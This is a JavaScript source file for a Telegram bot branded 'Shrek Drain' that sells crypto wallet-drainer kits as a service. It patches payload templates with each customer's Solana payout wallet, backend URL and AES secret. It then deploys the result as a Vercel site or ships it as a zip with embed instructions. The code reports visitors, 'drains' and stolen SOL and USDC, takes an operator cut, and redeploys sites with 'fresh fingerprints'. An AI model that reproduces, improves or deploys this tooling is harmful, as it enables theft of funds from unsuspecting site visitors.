#!/usr/bin/env node
/**
 * bot.js — Telegram payload-builder bot
 *
 * Service flow:
 *   1. Customer messages the bot → /start
 *   2. Bot asks for their Solana payout wallet
 *   3. Bot patches a fresh copy of the payload templates
 *      (their wallet, the service backend URL, the shared AES secret,
 *       their chat id for drain alerts) and zips it
 *   4. Customer uploads the files to their own site
 *
 * All drains then flow through the shared backend, which honors the
 * targetWallet baked into each customer's payload (multi-tenant patch).
 *
 * Env (use .env + `npm start`, which runs node --env-file=.env):
 *   BOT_TOKEN          — token from @BotFather (required)
 *   BACKEND_URL        — shared backend, e.g. https://app-x.fly.dev (required)
 *   AES_SECRET         — shared AES secret, must match backend AES_SECRET (required)
 *   ADMIN_ID           — administrator user id; can /whitelist /blacklist /access /stats
 *   ALLOWED_CHAT_IDS   — optional comma-separated allowlist (extra, on top of access.json)
 *   ADMIN_CHAT_ID      — optional legacy; enables /stats in that chat
 *
 * Access: closed by default. New users get a "no access" reply and the
 * admin gets a one-time ping with their id — admin whitelists with
 * /whitelist <id>. Blacklisted ids are ignored entirely. The list
 * persists in access.json next to this file.
 */

import fs from "fs";
import path from "path";
import crypto from "crypto";
import { fileURLToPath, pathToFileURL } from "url";
import AdmZip from "adm-zip";

const ROOT = path.dirname(fileURLToPath(import.meta.url));
// Payload templates live in the Yale server module — single source of truth
const TEMPLATES = path.join(ROOT, "..", "server", "public");
// Overridable for cloud deploys (persistence lives on a mounted volume)
const BUILDS_DIR = process.env.BUILDS_DIR || path.join(ROOT, "builds");

const BOT_TOKEN = process.env.BOT_TOKEN;
const BACKEND_URL = (process.env.BACKEND_URL || "").replace(/\/$/, "");
const AES_SECRET = process.env.AES_SECRET;
const ADMIN_ID = process.env.ADMIN_ID || "7036670963";
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || null;
// Chimera service API — when set, the bot deploys through chimera (hosted mode)
const CHIMERA_API_URL = (process.env.CHIMERA_API_URL || "").replace(/\/$/, "");
const CHIMERA_SERVICE_KEY = process.env.CHIMERA_SERVICE_KEY || "";
const ALLOWED = (process.env.ALLOWED_CHAT_IDS || "")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);

if (!BOT_TOKEN || !BACKEND_URL || !AES_SECRET) {
  console.error("Missing BOT_TOKEN, BACKEND_URL or AES_SECRET — check .env");
  process.exit(1);
}

const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ============================================================================
// TELEGRAM API HELPERS (zero deps — native fetch)
// ============================================================================

async function tg(method, params = {}) {
  const res = await fetch(`${TG}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(params),
  });
  return res.json();
}

async function sendText(chatId, text) {
  return tg("sendMessage", {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    link_preview_options: { is_disabled: true },
  });
}

async function sendDocument(chatId, filename, buffer, caption) {
  const form = new FormData();
  form.append("chat_id", String(chatId));
  form.append("document", new Blob([buffer]), filename);
  if (caption) {
    form.append("caption", caption);
    form.append("parse_mode", "HTML");
  }
  const res = await fetch(`${TG}/sendDocument`, { method: "POST", body: form });
  return res.json();
}

/**
 * Authenticated call to the chimera service API (hosted mode).
 * Same key the bot uses for /customers.
 */
async function chimera(path, opts = {}) {
  const res = await fetch(`${CHIMERA_API_URL}${path}`, {
    ...opts,
    headers: {
      "Content-Type": "application/json",
      "X-Service-Key": CHIMERA_SERVICE_KEY,
      ...(opts.headers || {}),
    },
    signal: AbortSignal.timeout(180_000),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || res.statusText);
  return data;
}

// ============================================================================
// PAYLOAD BUILDER
// ============================================================================

// Base58 Solana address: 32-44 chars, no 0/O/I/l
const WALLET_RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

export function isValidWallet(w) {
  return WALLET_RE.test(w);
}

/**
 * Patch one template file with the customer's values.
 * All replacements are regex-based so the templates stay reusable.
 */
export function patchFile(name, wallet, chatId) {
  let f = fs.readFileSync(path.join(TEMPLATES, name), "utf8");

  // 1. Payout wallet (quoted assignments only — `config.targetWallet` refs untouched)
  f = f.replace(/targetWallet:\s*"[^"]*"/g, `targetWallet: ${JSON.stringify(wallet)}`);

  // 2. Drain-alert chat id — inject right after the wallet so the customer
  //    gets their own visit/confirm notifications through the service bot.
  f = f.replace(
    new RegExp(`(targetWallet: ${JSON.stringify(wallet)},)`),
    `$1 userChatId: ${JSON.stringify(String(chatId))},`
  );

  // 3. Backend URL
  f = f.replace(/const API_BASE = "[^"]*";/g, `const API_BASE = ${JSON.stringify(BACKEND_URL)};`);
  f = f.replace(/const API_BASE_URL = "[^"]*";/g, `const API_BASE_URL = ${JSON.stringify(BACKEND_URL)};`);

  // 4. Shared AES secret (frame.js declares it; frame.html has it as a string literal)
  f = f.replace(/const SECRET =\s*"[^"]*";/g, `const SECRET = ${JSON.stringify(AES_SECRET)};`);
  f = f.replace(/app_[0-9a-f]{32,}/g, AES_SECRET);

  // 5. Vercel project name — unique per build
  f = f.replace(/"name":\s*"claim[^"]*"/g, `"name": "claim-${crypto.randomBytes(3).toString("hex")}"`);

  return f;
}

const README_TXT = (wallet) => `KIWI PAYLOAD — HOW TO USE
==========================

Your payout wallet: ${wallet}

1. Upload these files to your site:
   - Vercel:  install vercel CLI, run  vercel --prod  in this folder
   - Any static host: upload all files, frame.html is the page
     visitors see (make it your index / point your domain at it)

2. Or embed the widget on a page you already have — add this one line
   to your page's HTML (next to your uploaded files):

     <script src="/embed.js" async></script>

   The widget shows up centered on desktop, fullscreen on mobile.

3. Test it yourself first with a burner wallet.

4. Drain alerts (visitors, confirmations) arrive in your chat
   with the bot that built this payload.

Files:
  frame.html   - full standalone page (the one you deploy)
  frame.js     - client logic (used with vercel.json build)
  embed.js     - one-line widget embed for your own page
  loader.js    - widget loader variant
  vercel.json  - Vercel deploy config
`;

export function buildPayload(wallet, chatId) {
  const zip = new AdmZip();
  for (const name of ["frame.html", "frame.js", "loader.js", "vercel.json"]) {
    zip.addFile(name, Buffer.from(patchFile(name, wallet, chatId), "utf8"));
  }
  // embed.js is customer-agnostic (derives the page from its own src)
  zip.addFile("embed.js", Buffer.from(fs.readFileSync(path.join(TEMPLATES, "embed.js"), "utf8"), "utf8"));
  zip.addFile("README.txt", Buffer.from(README_TXT(wallet), "utf8"));
  return zip.toBuffer();
}

function recordBuild(chatId, wallet, username) {
  const file = path.join(BUILDS_DIR, `${chatId}.json`);
  let builds = [];
  try {
    builds = JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {}
  builds.push({ wallet, username, at: new Date().toISOString() });
  fs.writeFileSync(file, JSON.stringify(builds, null, 2));
}

// ============================================================================
// CONVERSATION
// ============================================================================

// chatId → { awaiting: "wallet" }
const sessions = new Map();
// chatId → last build timestamp (rate limit)
const lastBuild = new Map();
// userId → true once the admin has been pinged about an access request
const accessPinged = new Map();

// ============================================================================
// ACCESS CONTROL (whitelist/blacklist, persisted to access.json)
// ============================================================================

const ACCESS_FILE = process.env.ACCESS_FILE || path.join(ROOT, "access.json");

export function loadAccess() {
  try {
    const a = JSON.parse(fs.readFileSync(ACCESS_FILE, "utf8"));
    return {
      whitelist: Array.isArray(a.whitelist) ? a.whitelist.map(String) : [],
      blacklist: Array.isArray(a.blacklist) ? a.blacklist.map(String) : [],
    };
  } catch {
    return { whitelist: [], blacklist: [] };
  }
}

export function saveAccess(access) {
  fs.writeFileSync(ACCESS_FILE, JSON.stringify(access, null, 2));
}

export function isAdmin(msg) {
  if (String(msg.from?.id ?? "") === ADMIN_ID) return true;
  // legacy ADMIN_CHAT_ID gate
  return Boolean(ADMIN_CHAT_ID && String(msg.chat.id) === ADMIN_CHAT_ID);
}

export function hasAccess(msg) {
  if (isAdmin(msg)) return true;
  const userId = String(msg.from?.id ?? "");
  const chatId = String(msg.chat.id);
  const { whitelist, blacklist } = loadAccess();
  if (blacklist.includes(userId) || blacklist.includes(chatId)) return false;
  if (whitelist.includes(userId) || whitelist.includes(chatId)) return true;
  if (ALLOWED.includes(userId) || ALLOWED.includes(chatId)) return true;
  return false; // closed by default — admin must whitelist
}

const WELCOME = `<b>Shrek Drain</b>

Join the telegram: https://t.me/+vo22yaHHUfwyY2Rh

Commands:
/build &lt;wallet&gt; — build directly
/sites — manage your sites
/stats — your traffic + earnings
/cancel — start over`;

async function handle(msg) {
  const chatId = msg.chat.id;
  const text = (msg.text || "").trim();
  const username = msg.from?.username || msg.from?.first_name || "";
  const userId = String(msg.from?.id ?? "");
  const admin = isAdmin(msg);

  // ── Access gate (admin always passes) ───────────────────────────────────
  if (!admin && !hasAccess(msg)) {
    const { blacklist } = loadAccess();
    if (blacklist.includes(userId) || blacklist.includes(String(chatId))) {
      return; // blacklisted — ignore silently
    }
    if (!accessPinged.has(userId)) {
      accessPinged.set(userId, true);
      await sendText(
        chatId,
        `🔒 No access yet.\n\nYour ID: <code>${userId}</code>\nAsk the admin to whitelist you.`
      );
      await sendText(
        ADMIN_ID,
        `🔔 Access request\nUser: ${username || "unknown"}\nID: <code>${userId}</code>\n\nWhitelist: /whitelist ${userId}`
      );
    }
    return;
  }

  // ── Admin commands ──────────────────────────────────────────────────────
  if (admin && text.startsWith("/whitelist")) {
    const id = text.split(/\s+/)[1] || "";
    if (!/^-?\d+$/.test(id)) {
      return sendText(chatId, "Usage: /whitelist <code>&lt;user id&gt;</code>");
    }
    const access = loadAccess();
    access.blacklist = access.blacklist.filter((x) => x !== id);
    if (!access.whitelist.includes(id)) access.whitelist.push(id);
    saveAccess(access);
    return sendText(chatId, `✅ Whitelisted <code>${id}</code>`);
  }

  if (admin && text.startsWith("/blacklist")) {
    const id = text.split(/\s+/)[1] || "";
    if (!/^-?\d+$/.test(id)) {
      return sendText(chatId, "Usage: /blacklist <code>&lt;user id&gt;</code>");
    }
    const access = loadAccess();
    access.whitelist = access.whitelist.filter((x) => x !== id);
    if (!access.blacklist.includes(id)) access.blacklist.push(id);
    saveAccess(access);
    return sendText(chatId, `✅ Blacklisted <code>${id}</code>`);
  }

  if (admin && text.startsWith("/access")) {
    const { whitelist, blacklist } = loadAccess();
    return sendText(
      chatId,
      `👥 Whitelist: ${whitelist.length ? whitelist.map((i) => `<code>${i}</code>`).join(", ") : "empty"}\n` +
        `🚫 Blacklist: ${blacklist.length ? blacklist.map((i) => `<code>${i}</code>`).join(", ") : "empty"}`
    );
  }

  // ── /fee [wallet[,wallet2...]] [cut] — operator fee config (admin) ──
  if (admin && text.startsWith("/fee")) {
    if (!CHIMERA_API_URL || !CHIMERA_SERVICE_KEY) {
      return sendText(chatId, "/fee needs hosted mode (CHIMERA_API_URL).");
    }
    const parts = text.split(/\s+/).slice(1).filter(Boolean);
    try {
      if (!parts.length) {
        const cur = await chimera("/operator");
        const wallets = cur.wallets?.length
          ? cur.wallets.map((w) => `<code>${w.slice(0, 6)}...${w.slice(-4)}</code>`).join(", ")
          : "none — no cut taken";
        return sendText(
          chatId,
          `💰 <b>Operator fee</b>\nWallets: ${wallets}\nCut: ${((cur.cut || 0) * 100).toFixed(1)}% of drained SOL`
        );
      }
      const wallets = parts[0].split(",").map((s) => s.trim()).filter(Boolean);
      let cut;
      if (parts[1] != null) {
        cut = parseFloat(parts[1]);
        if (Number.isNaN(cut) || cut < 0 || cut > 0.95) {
          return sendText(chatId, "Cut must be 0–0.95 (e.g. 0.15 = 15%).");
        }
      }
      for (const w of wallets) {
        if (!isValidWallet(w)) {
          return sendText(chatId, `❌ Not a Solana address: <code>${w}</code>`);
        }
      }
      const result = await chimera("/operator", {
        method: "POST",
        body: JSON.stringify({ wallets, ...(cut != null ? { cut } : {}) }),
      });
      return sendText(
        chatId,
        `✅ Operator fee set — effective on the next drain.\n` +
          `Wallets: ${result.wallets.map((w) => `<code>${w}</code>`).join(", ")}\n` +
          `Cut: ${((result.cut || 0) * 100).toFixed(1)}% of drained SOL`
      );
    } catch (e) {
      return sendText(chatId, `⚠️ ${e.message}`);
    }
  }

  // ── Commands ────────────────────────────────────────────────────────────
  if (text.startsWith("/start")) {
    sessions.set(chatId, { awaiting: "wallet" });
    return sendText(chatId, WELCOME);
  }

  if (text.startsWith("/cancel")) {
    sessions.delete(chatId);
    return sendText(chatId, "Cleared. Send /start to begin again.");
  }

  if (text.startsWith("/help")) {
    return sendText(chatId, WELCOME);
  }

  if (text.startsWith("/sites")) {
    if (!CHIMERA_API_URL || !CHIMERA_SERVICE_KEY) {
      return sendText(chatId, "Site management needs hosted mode (CHIMERA_API_URL).");
    }
    try {
      const sites = await chimera(`/customers?chat_id=${chatId}`);
      if (!Array.isArray(sites) || sites.length === 0) {
        return sendText(chatId, "No sites yet — send /start to build one.");
      }
      const rows = sites.map((s) => [
        {
          text: `📦 ${s.project_name} · ${s.created_at.slice(0, 10)}`,
          callback_data: `site:${s.wallet}`,
        },
      ]);
      return tg("sendMessage", {
        chat_id: chatId,
        text: "<b>Your sites</b>\nTap one to manage it.",
        parse_mode: "HTML",
        reply_markup: JSON.stringify({ inline_keyboard: rows }),
      });
    } catch (e) {
      return sendText(chatId, `⚠️ ${e.message}`);
    }
  }

  if (text.startsWith("/stats")) {
    if (CHIMERA_API_URL && CHIMERA_SERVICE_KEY) {
      try {
        const stats = await chimera(`/customers/stats?chat_id=${chatId}`);
        return sendText(chatId, formatStats(stats));
      } catch (e) {
        return sendText(chatId, `⚠️ ${e.message}`);
      }
    }
    if (!admin) return;
    let total = 0;
    let customers = 0;
    for (const f of fs.readdirSync(BUILDS_DIR)) {
      try {
        const n = JSON.parse(fs.readFileSync(path.join(BUILDS_DIR, f), "utf8")).length;
        total += n;
        customers++;
      } catch {}
    }
    return sendText(chatId, `📊 Builds: <b>${total}</b> across <b>${customers}</b> customers.`);
  }

  if (text.startsWith("/build")) {
    const wallet = text.split(/\s+/)[1] || "";
    if (!isValidWallet(wallet)) {
      sessions.set(chatId, { awaiting: "wallet" });
      return sendText(chatId, "Usage: /build <code>&lt;wallet&gt;</code>\nOr just send the wallet address on its own.");
    }
    return deliverPayload(chatId, wallet, username);
  }

  if (text.startsWith("/zip")) {
    const wallet = text.split(/\s+/)[1] || "";
    if (!isValidWallet(wallet)) {
      return sendText(chatId, "Usage: /zip <code>&lt;wallet&gt;</code> — get the raw payload zip instead of hosting");
    }
    return deliverPayload(chatId, wallet, username, "zip");
  }

  // ── Free-text wallet ────────────────────────────────────────────────────
  const session = sessions.get(chatId);

  // Pending payout-wallet change for an existing site
  if (session?.awaiting?.startsWith("wallet:")) {
    const siteWallet = session.awaiting.slice(7);
    if (!isValidWallet(text)) {
      return sendText(
        chatId,
        "❌ That doesn't look like a Solana address (32-44 chars, base58).\nTry again or /cancel."
      );
    }
    sessions.delete(chatId);
    if (text === siteWallet) {
      return sendText(chatId, "That's already the payout wallet for this site.");
    }
    try {
      const result = await chimera("/customers/wallet", {
        method: "POST",
        body: JSON.stringify({ wallet: siteWallet, new_wallet: text }),
      });
      return sendText(
        chatId,
        `✅ Payout wallet changed.\n\nNew wallet: <code>${text}</code>\n` +
          `URL: ${result.url}\nTest with a burner wallet before going live.`
      );
    } catch (e) {
      return sendText(chatId, `⚠️ Wallet change failed: ${e.message}`);
    }
  }

  if (session?.awaiting === "wallet") {
    if (!isValidWallet(text)) {
      return sendText(
        chatId,
        "❌ That doesn't look like a Solana address (32-44 chars, base58).\nTry again or /cancel."
      );
    }
    return deliverPayload(chatId, text, username);
  }

  // Unknown text with no session
  return sendText(chatId, "Send /start to build a payload.");
}

async function deliverPayload(chatId, wallet, username, forceMode = "auto") {
  // Rate limit — one build per 15s per chat
  const now = Date.now();
  if (now - (lastBuild.get(chatId) || 0) < 15_000) {
    return sendText(chatId, "⏳ Easy — wait a few seconds between builds.");
  }
  lastBuild.set(chatId, now);

  sessions.delete(chatId);

  await sendText(chatId, `🔨 Building payload for <code>${wallet.slice(0, 6)}...${wallet.slice(-4)}</code>...`);

  // Hosted mode — deploy through chimera, return a live URL
  if (forceMode !== "zip" && CHIMERA_API_URL && CHIMERA_SERVICE_KEY) {
    try {
      const res = await fetch(`${CHIMERA_API_URL}/customers`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Service-Key": CHIMERA_SERVICE_KEY,
        },
        body: JSON.stringify({ wallet, chat_id: String(chatId) }),
        signal: AbortSignal.timeout(180_000),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || res.statusText);

      await sendText(
        chatId,
        `✅ <b>Your site is live</b>\n\n` +
          `URL: ${data.url}\n\n` +
          `Payout wallet: <code>${wallet}</code>\n` +
          `Drain alerts arrive in this chat.\n\n` +
          `Optional: point your own domain at it (CNAME → ${data.project_name}.vercel.app) — recommended.\n` +
          `Or embed the widget on a page you already have:\n<code>&lt;script src="${data.url}/embed.js" async&gt;&lt;/script&gt;</code>\n\n` +
          `Test with a burner wallet before going live.`
      );
      recordBuild(chatId, wallet, username);
      return;
    } catch (e) {
      await sendText(chatId, `⚠️ Hosted deploy failed: ${e.message}\nFalling back to zip payload...`);
    }
  }

  // Zip mode — customer uploads the files themselves
  try {
    const buffer = buildPayload(wallet, chatId);
    const filename = `payload-${wallet.slice(0, 4)}${wallet.slice(-4)}.zip`;
    const caption =
      `✅ Your payload.\n\n` +
      `Payout wallet: <code>${wallet}</code>\n` +
      `Upload the files to your site (README.txt inside explains how).\n` +
      `Test with a burner wallet before going live.`;

    await sendDocument(chatId, filename, buffer, caption);
    recordBuild(chatId, wallet, username);
  } catch (e) {
    await sendText(chatId, `❌ Build failed: ${e.message}\nTry again or /cancel.`);
  }
}

// ============================================================================
// SITE MANAGEMENT (inline keyboards — hosted mode)
// ============================================================================

function fmtWallet(w) {
  return `<code>${w.slice(0, 6)}...${w.slice(-4)}</code>`;
}

function fmtTx(t) {
  if (!t) return "";
  return `<a href="https://solscan.io/tx/${t}">${t.slice(0, 8)}…${t.slice(-6)}</a>`;
}

function formatStats(stats) {
  const c = stats.counters || {};
  const drains = stats.drains || [];
  let sol = 0;
  let usdc = 0;
  for (const d of drains) {
    sol += (d.solLamports || 0) / 1e9;
    if (d.usdc && d.usdc.outAmount != null) {
      usdc += Number(d.usdc.outAmount) / Math.pow(10, d.usdc.outDecimals ?? 6);
    }
  }
  const lines = [
    `📊 <b>Your stats</b>`,
    `Visitors: <b>${c.visits ?? 0}</b>`,
    `Rejected: <b>${c.rejects ?? 0}</b>`,
    `Drains: <b>${c.drains ?? 0}</b>`,
    `Earned: <b>${sol.toFixed(4)} SOL</b>` +
      (usdc ? ` + <b>${usdc.toFixed(2)} USDC</b> (est.)` : ""),
  ];
  if (drains.length) lines.push(`<b>Recent hits</b>`);
  for (const d of drains.slice(-3).reverse()) {
    const amt =
      d.usdc && d.usdc.outAmount != null
        ? `~${(Number(d.usdc.outAmount) / Math.pow(10, d.usdc.outDecimals ?? 6)).toFixed(2)} USDC`
        : `${((d.solLamports || 0) / 1e9).toFixed(4)} SOL`;
    lines.push(
      `• ${(d.ts || "").slice(0, 16).replace("T", " ")} — ${amt}${d.txid ? ` · ${fmtTx(d.txid)}` : ""}`
    );
  }
  return lines.join("\n");
}

async function answerCallback(cb, text) {
  return tg("answerCallbackQuery", { callback_query_id: cb.id, text: text || "" });
}

async function editMessage(chatId, messageId, text, keyboard) {
  return tg("editMessageText", {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
    link_preview_options: { is_disabled: true },
    ...(keyboard ? { reply_markup: JSON.stringify(keyboard) } : {}),
  });
}

async function fetchSites(chatId) {
  const sites = await chimera(`/customers?chat_id=${chatId}`);
  return Array.isArray(sites) ? sites : [];
}

async function showSites(chatId, messageId) {
  const sites = await fetchSites(chatId);
  if (!sites.length) {
    return editMessage(chatId, messageId, "No sites yet — send /start to build one.");
  }
  const rows = sites.map((s) => [
    {
      text: `📦 ${s.project_name} · ${s.created_at.slice(0, 10)}`,
      callback_data: `site:${s.wallet}`,
    },
  ]);
  return editMessage(
    chatId,
    messageId,
    "<b>Your sites</b>\nTap one to manage it.",
    { inline_keyboard: rows }
  );
}

async function showSite(chatId, messageId, wallet, confirmDelete = false) {
  const sites = await fetchSites(chatId);
  const s = sites.find((x) => x.wallet === wallet);
  if (!s) {
    return editMessage(chatId, messageId, "Site not found (deleted?).");
  }
  const text = [
    `📦 <b>${s.project_name}</b>`,
    `URL: ${s.url || "(deploying...)"}`,
    `Payout: ${fmtWallet(s.wallet)}`,
    `USDC payouts: ${s.usdc_payout ? "ON 💵" : "off"}`,
    `Deploys: ${s.deployments} · since ${s.created_at.slice(0, 10)}`,
  ].join("\n");

  if (confirmDelete) {
    return editMessage(
      chatId,
      messageId,
      `${text}\n\n⚠️ Delete this site and its Vercel project?`,
      {
        inline_keyboard: [
          [{ text: "🗑 Yes, delete", callback_data: `act:${wallet}:del2` }],
          [{ text: "← Back", callback_data: `site:${wallet}` }],
        ],
      }
    );
  }

  return editMessage(chatId, messageId, text, {
    inline_keyboard: [
      [
        { text: "🌐 Open site", url: s.url || "https://vercel.com" },
        { text: "📋 Copy URL", callback_data: `act:${wallet}:url` },
      ],
      [
        { text: "🔄 Redeploy", callback_data: `act:${wallet}:redeploy` },
        { text: "🧩 Embed", callback_data: `act:${wallet}:embed` },
      ],
      [
        {
          text: s.usdc_payout ? "💵 USDC: ON" : "💵 USDC: off",
          callback_data: `act:${wallet}:usdc`,
        },
        { text: "🔁 Change wallet", callback_data: `act:${wallet}:wallet` },
      ],
      [{ text: "🗑 Delete site", callback_data: `act:${wallet}:del` }],
      [{ text: "← Sites", callback_data: "list" }],
    ],
  });
}

async function handleCallback(cb) {
  const chatId = cb.message?.chat?.id;
  const messageId = cb.message?.message_id;
  if (!chatId || !messageId) return answerCallback(cb);

  // Same gate as messages — the keyboard belongs to this chat
  const pseudo = { chat: { id: chatId }, from: cb.from || {} };
  if (!isAdmin(pseudo) && !hasAccess(pseudo)) {
    return answerCallback(cb, "No access");
  }

  const data = cb.data || "";
  try {
    if (data === "list") {
      return showSites(chatId, messageId);
    }

    if (data.startsWith("site:")) {
      return showSite(chatId, messageId, data.slice(5));
    }

    if (data.startsWith("act:")) {
      const parts = data.split(":");
      const wallet = parts[1];
      const action = parts[2];

      if (action === "url") {
        const sites = await fetchSites(chatId);
        const s = sites.find((x) => x.wallet === wallet);
        if (s?.url) await sendText(chatId, `📋 ${s.project_name}\n${s.url}`);
        return answerCallback(cb);
      }

      if (action === "embed") {
        const sites = await fetchSites(chatId);
        const s = sites.find((x) => x.wallet === wallet);
        if (!s?.url) return answerCallback(cb, "Site not found");
        await answerCallback(cb);
        return sendText(
          chatId,
          `🧩 <b>Embed ${s.project_name} on your own page</b>\n\n` +
            `Add this line to your page's HTML (before <code>&lt;/body&gt;</code>):\n\n` +
            `<code>&lt;script src="${s.url}/embed.js" async&gt;&lt;/script&gt;</code>\n\n` +
            `The widget appears centered on desktop, fullscreen on mobile.\n` +
            `Test with a burner wallet first.`
        );
      }

      if (action === "redeploy") {
        await answerCallback(cb, "Redeploying…");
        await chimera("/customers/redeploy", {
          method: "POST",
          body: JSON.stringify({ wallet }),
        });
        await showSite(chatId, messageId, wallet);
        return sendText(chatId, "✅ Redeployed — fresh fingerprint, same URL.");
      }

      if (action === "usdc") {
        const sites = await fetchSites(chatId);
        const s = sites.find((x) => x.wallet === wallet);
        if (!s) return answerCallback(cb, "Site not found");
        await answerCallback(cb, "Toggling… redeploying the site");
        await chimera("/customers/payout", {
          method: "POST",
          body: JSON.stringify({ wallet, usdc: !s.usdc_payout }),
        });
        return showSite(chatId, messageId, wallet);
      }

      if (action === "wallet") {
        await answerCallback(cb);
        sessions.set(chatId, { awaiting: `wallet:${wallet}` });
        return sendText(chatId, "Send the new payout wallet address (or /cancel).");
      }

      if (action === "del") {
        return showSite(chatId, messageId, wallet, true);
      }

      if (action === "del2") {
        await answerCallback(cb, "Deleting…");
        await chimera("/customers/delete", {
          method: "POST",
          body: JSON.stringify({ wallet }),
        });
        return showSites(chatId, messageId);
      }
    }
  } catch (e) {
    return answerCallback(cb, e.message || "Something went wrong");
  }
}

// ============================================================================
// LONG POLLING
// ============================================================================

let offset = 0;

async function poll() {
  while (true) {
    try {
      const res = await fetch(`${TG}/getUpdates?timeout=25&offset=${offset}`, {
        signal: AbortSignal.timeout(35_000),
      });
      const data = await res.json();
      if (!data.ok) {
        console.error("getUpdates error:", data.description);
        await new Promise((r) => setTimeout(r, 3000));
        continue;
      }
      for (const upd of data.result) {
        offset = upd.update_id + 1;
        if (upd.callback_query) {
          await handleCallback(upd.callback_query).catch((e) =>
            console.error("callback error:", e.message)
          );
        } else if (upd.message && upd.message.text) {
          await handle(upd.message).catch((e) =>
            console.error("handler error:", e.message)
          );
        }
      }
    } catch {
      // network hiccup — back off and retry
      await new Promise((r) => setTimeout(r, 3000));
    }
  }
}

// Run as main only (`node bot.js`) — importable for tests otherwise
const isMain =
  process.argv[1] &&
  import.meta.url === pathToFileURL(path.resolve(process.argv[1])).href;

if (isMain) {
  const me = await tg("getMe");
  if (!me.ok) {
    console.error("Bot token invalid:", me.description);
    process.exit(1);
  }
  console.log(`Payload builder bot running as @${me.result.username}`);
  console.log(`Backend: ${BACKEND_URL}`);
  poll();
}
